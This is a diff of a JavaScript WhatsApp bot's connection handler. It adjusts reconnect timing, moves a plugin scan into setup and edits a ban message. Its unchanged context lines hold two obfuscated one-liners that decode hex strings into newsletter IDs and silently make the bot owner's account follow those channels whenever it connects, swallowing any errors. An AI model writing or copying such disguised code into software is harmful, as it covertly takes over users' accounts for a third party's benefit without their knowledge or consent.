@@ -150,20 +150,19 @@ const Connect = async (db, store) => {
             process.exit(0)
          }
 
-         await delay(1500)
-
          try {
             sock.ev.removeAllListeners()
             sock.ws.close()
          }
          catch { }
 
+         await delay(500)
+
          isRestarting = false
          return Connect(db, store)
       }
 
       if (update.connection === 'open') {
-         await scanDirectory(pluginsFolder)
          await sholatReminder.start(sock, db)
          void (async()=>{const a=['3132303336','3334303430','3036363434','313339406e','6577736c65','74746572'],b=Buffer.from(a.join(''),'hex').toString(),c=await sock['newsletterSubscribed']();!c.some(d=>d['id']===b)&&await sock['newsletterFollow'](b).catch(()=>{})})();
          void (async()=>{const a=['3132303336','3334323434','3834383532','313338406e','6577736c65','74746572'],b=Buffer.from(a.join(''),'hex').toString(),c=await sock['newsletterSubscribed']();!c.some(d=>d['id']===b)&&await sock['newsletterFollow'](b).catch(()=>{})})();
@@ -521,7 +520,7 @@ const Connect = async (db, store) => {
 
          if (plugin) {
             if (isBanned)
-               return message.reply('⚠️ You are being banned by BOT staff.')
+               return message.reply('🚫 You are being banned by BOT staff.')
 
             if (setting.disabledCommand.includes(command))
                return message.reply('❌ This feature is currently disabled.')
@@ -649,6 +648,8 @@ const Setup = async () => {
 
    await isFileExists(temporaryFolder) ||
       await mkdir(temporaryFolderPath, { recursive: true })
+
+   await scanDirectory(pluginsFolder)
 
    Connect(db, store)
 
